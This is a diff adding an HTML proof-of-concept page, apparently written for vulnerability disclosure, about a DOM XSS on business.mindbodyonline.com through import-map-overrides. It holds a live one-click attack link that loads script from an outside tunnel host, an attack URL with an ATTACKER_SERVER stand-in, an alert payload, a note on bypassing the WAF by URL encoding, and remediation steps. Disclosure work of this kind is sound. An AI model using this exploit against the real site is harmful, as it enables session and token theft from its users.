@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Mindbody XSS PoC - Click to Reproduce</title>
+<style>
+body { font-family: -apple-system, sans-serif; background: #1a1a2e; color: #eee; padding: 40px; max-width: 800px; margin: 0 auto; }
+h1 { color: #ff6b6b; }
+.poc-link { display: block; background: #d32f2f; color: #fff; padding: 16px 24px; border-radius: 8px; text-decoration: none; font-size: 18px; font-weight: 600; text-align: center; margin: 30px 0; }
+.poc-link:hover { background: #f44336; }
+pre { background: #0d1117; padding: 16px; border-radius: 8px; overflow-x: auto; font-size: 13px; border: 1px solid #333; }
+.label { color: #888; font-size: 12px; text-transform: uppercase; margin-bottom: 4px; }
+.impact { background: #2d1b1b; border: 1px solid #f44; border-radius: 8px; padding: 16px; margin: 20px 0; }
+</style>
+</head>
+<body>
+<h1>DOM XSS via import-map-overrides on business.mindbodyonline.com</h1>
+<p><strong>Severity:</strong> Critical (CVSS 9.6) | <strong>Type:</strong> Reflected → Stored DOM XSS</p>
+
+<p class="label">1-Click Proof of Concept</p>
+<a class="poc-link" href="https://business.mindbodyonline.com/?imo=%7B%22imports%22%3A%7B%22%40mb/appshell-config%22%3A%22https%3A//wives-furnishings-sept-headquarters.trycloudflare.com/xss.js%22%7D%7D" target="_blank">
+  Click Here to Trigger XSS on business.mindbodyonline.com
+</a>
+<p style="color:#888;text-align:center;font-size:13px;">Expected result: JavaScript alert() on business.mindbodyonline.com</p>
+
+<p class="label">Attack URL</p>
+<pre>https://business.mindbodyonline.com/?imo=%7B%22imports%22%3A%7B%22%40mb/appshell-config%22%3A%22https%3A//ATTACKER_SERVER/xss.js%22%7D%7D</pre>
+
+<p class="label">Payload (xss.js)</p>
+<pre>System.register([], function(exports) {
+  return {
+    execute: function() {
+      document.title = "PWNED-" + document.domain;
+      alert("XSS on " + document.domain);
+    }
+  };
+});</pre>
+
+<div class="impact">
+<p class="label">Impact</p>
+<ul>
+<li>One-click XSS on the main business portal (40,000+ businesses)</li>
+<li>Full session hijacking — steal OIDC tokens, cookies, API keys</li>
+<li>Persistent — localStorage poisoning survives page refreshes</li>
+<li>Chainable with Branch.io open redirect for higher credibility</li>
+<li>No authentication required — works against unauthenticated AND authenticated users</li>
+</ul>
+</div>
+
+<p class="label">Root Cause</p>
+<pre>1. import-map-overrides@2.2.0 loaded in PRODUCTION (dev-only library)
+2. No Content-Security-Policy header
+3. SystemJS module loader trusts localStorage overrides
+4. Cloudflare WAF bypassed via URL-encoding the ?imo= JSON parameter</pre>
+
+<p class="label">Remediation</p>
+<pre>1. CRITICAL: Remove import-map-overrides.js from production
+2. CRITICAL: Add Content-Security-Policy: script-src 'self' https://cdn.jsdelivr.net
+3. HIGH: Add WAF rule for ?imo= parameter (even URL-encoded variants)</pre>
+</body>
+</html>
